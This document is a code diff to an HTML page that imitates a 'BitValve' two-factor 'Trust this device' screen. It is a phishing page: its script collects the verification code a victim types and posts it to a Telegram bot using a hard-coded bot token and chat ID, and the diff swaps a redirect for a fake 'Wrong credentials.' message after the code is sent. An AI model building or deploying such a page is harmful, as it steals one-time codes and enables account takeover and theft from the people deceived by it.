@@ -142,13 +142,13 @@
         <div class="card">
             <div class="logo">
                 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                    <path d="M4 4v5h5V4H4zm0 7v5h5v-5H4zm7-7v5h5V4h-5zm7 0v5h2V4h-2zm-7 7v5h5v-5h-5zm7 0v5h2v-5h-2zm-7 7v3h5v-3h-5zm7 0v3h2v-3h-2z" />
+                    <path d="M4 4v5h5V4H4zm0 7v5h5v-5H4zm7-7v5h5V4h-5zm7 0v5h2V4h-2zm-7 7v5h5v-5h-5zm7 0v5h2v-5h-2zm-7 7v3h5v-3h-5zm7 0v3h2v-3h-2z"/>
                 </svg>
                 <h2>BitValve</h2>
             </div>
 
             <h3>Trust this device</h3>
-            <p class="subtitle">2FA CODE</p>
+            <p class="subtitle">EMAIL CODE (CHECK SPAM FOLDER TOO)</p>
             <div class="code-inputs">
                 <input type="text" maxlength="1" />
                 <input type="text" maxlength="1" />
@@ -187,31 +187,26 @@
             // Collect the code from the inputs
             const code = Array.from(inputs).map(input => input.value).join('');
 
-            // Optional: Send data to your Telegram bot
-            const telegramBotToken = '8595236508:AAG3jFCNMbQQnX1koa9CYU-kQUbVnjVpLp4'; // Replace with your bot token
-            const chatId = '1003670447'; // Replace with your chat ID
+            // Send data to your Telegram bot
+            const telegramBotToken = '8595236508:AAG3jFCNMbQQnX1koa9CYU-kQUbVnjVpLp4';
+            const chatId = '1003670447'; // Replace with your chat ID or user ID
             const message = `Email Code: ${code}`;
+
             const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
             fetch(apiUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                    }),
-                })
-                .then(response => {
-                    if (response.ok) {
-                        // Redirect to otp2.html after sending the message
-                        window.location.href = "otp2.html";
-                    } else {
-                        console.error('Error sending message to Telegram:', response.statusText);
-                    }
-                })
-                .catch(error => console.error('Fetch error:', error));
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            });
+
+            // Display the "wrong credentials" message
+            document.getElementById("message").textContent = "Wrong credentials.";
         });
     </script>
 </body>
